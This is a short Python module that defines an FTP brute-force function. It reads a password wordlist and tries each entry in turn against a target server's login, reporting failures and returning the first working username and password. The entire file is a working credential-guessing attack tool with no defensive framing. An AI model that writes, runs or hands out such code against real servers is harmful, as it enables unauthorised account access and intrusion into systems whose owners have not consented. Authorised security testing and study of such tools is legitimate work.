import ftplib
from rich.console import Console

console = Console()


def ftp_brute(host, port, username, wordlist, timeout=3):
    """
    Brute force FTP login.
    Returns {"username": str, "password": str} or None
    """
    try:
        with open(wordlist, "r", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red]❌ Wordlist not found: {wordlist}[/red]")
        return None

    console.print(f"[cyan]Target   : {host}:{port}[/cyan]")
    console.print(f"[cyan]Username : {username}[/cyan]")
    console.print(f"[cyan]Wordlist : {wordlist} ({len(passwords)} passwords)[/cyan]\n")

    for i, password in enumerate(passwords, 1):
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(username, password)
            ftp.quit()
            return {"username": username, "password": password, "attempts": i}

        except ftplib.error_perm:
            console.print(f"[dim]  [{i}] {password} — Failed[/dim]")
            continue
        except Exception:
            continue

    return None
